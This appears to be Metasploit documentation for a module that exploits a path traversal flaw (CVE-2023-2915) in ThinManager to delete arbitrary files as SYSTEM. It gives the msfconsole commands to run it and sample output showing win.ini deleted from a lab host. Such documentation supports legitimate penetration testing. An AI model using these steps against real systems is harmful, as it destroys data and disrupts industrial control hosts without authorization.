## Vulnerable Application

This module exploits a path traversal vulnerability in ThinManager <= v13.1.0 (CVE-2023-2915) to delete an arbitrary file from the
system.

The affected service listens by default on TCP port 2031 and runs in the context of NT AUTHORITY\SYSTEM.

## Testing

The software can be obtained from
[the vendor](https://thinmanager.com/downloads/).

**Successfully tested on**

- ThinManager v13.1.0 on Windows 22H2
- ThinManager v13.0.1 on Windows 22H2
- ThinManager v13.0.0 on Windows 22H2
- ThinManager v12.1.5 on Windows 22H2
- ThinManager v10.0.2 on Windows 22H2

## Verification Steps

1. Install and run the application
2. Start `msfconsole` and run the following commands:

```
msf6 > use auxiliary/gather/thinmanager_traversal_delete
msf6 auxiliary(gather/thinmanager_traversal_delete) > set RHOSTS <IP>
msf6 auxiliary(gather/thinmanager_traversal_delete) > set FILE <file to delete>
msf6 auxiliary(gather/thinmanager_traversal_delete) > run
```

This should delete the file as specified through FILE from the remote server.

## Options

### FILE
The file to delete from the remote server.

## Scenarios

Running the exploit against ThinManager v13.0.1 on Windows 22H2 should result in an output similar to the following:

```
msf6 auxiliary(gather/thinmanager_traversal_delete) > run
[*] Running module against 192.168.137.229

[*] 192.168.137.229:2031 - Running automatic check ("set AutoCheck false" to disable)
[!] 192.168.137.229:2031 - The service is running, but could not be validated.
[*] 192.168.137.229:2031 - Sending handshake...
[*] 192.168.137.229:2031 - Received handshake response.
[*] 192.168.137.229:2031 - Deleting /Windows/win.ini from 192.168.137.229
[+] 192.168.137.229:2031 - Received response from target.
[*] Auxiliary module execution completed
```
